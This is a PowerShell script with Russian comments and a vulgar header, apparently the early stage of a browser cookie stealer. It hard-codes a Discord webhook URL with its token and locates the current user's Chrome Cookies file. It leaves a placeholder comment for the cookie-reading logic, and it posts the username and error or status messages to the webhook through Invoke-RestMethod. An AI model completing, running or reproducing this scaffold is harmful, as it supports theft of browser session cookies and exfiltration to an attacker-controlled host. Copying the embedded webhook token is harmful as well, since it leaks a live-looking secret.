# хуй хуй

# Укажи URL твоего Discord webhook
$webhookUrl = "https://discord.com/api/webhooks/1382033925676994591/fD2Tkr-ggL7QXrjiGs3phMu80IyTcQOPGUBstF4-vmDRVa9prGbeISQFqAGrnFmuq72a"

# Получаем имя пользователя и путь к файлу cookies Chrome
$username = $env:USERNAME
$chromePath = "C:\Users\$username\AppData\Local\Google\Chrome\User Data\Default\Cookies"

if (Test-Path $chromePath) {
    try {
        # Здесь должна быть основная логика скрипта (например, чтение cookies)
        # Для теста можно добавить: throw "Simulated error"
        Write-Output "Обработка cookies..."
        # (Замени это на свою логику)
    }
    catch {
        # Ловим сообщение об ошибке
        $errorMessage = "Ошибка: " + $_.ToString()
        
        # Формируем embed для ошибки
        $embed = @{
            title = "Script Error"
            description = "Произошла ошибка при выполнении скрипта."
            color = 16711680  # Красный цвет
            fields = @(
                @{
                    name = "Сообщение об ошибке"
                    value = $errorMessage
                    inline = $false
                }
            )
        }
        
        # Создаем полезную нагрузку с embed
        $payload = @{
            embeds = @($embed)
        }
        
        # Преобразуем в JSON и отправляем в Discord
        $jsonBody = $payload | ConvertTo-Json -Depth 3
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonBody -ContentType "application/json"
    }
}
else {
    # Формируем embed для случая "файл не найден"
    $embed = @{
        title = "File Not Found"
        description = "Файл cookies Chrome не найден для пользователя $username"
        color = 16776960  # Желтый цвет
    }
    
    # Создаем полезную нагрузку с embed
    $payload = @{
        embeds = @($embed)
    }
    
    # Преобразуем в JSON и отправляем в Discord
    $jsonBody = $payload | ConvertTo-Json -Depth 3
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonBody -ContentType "application/json"
}
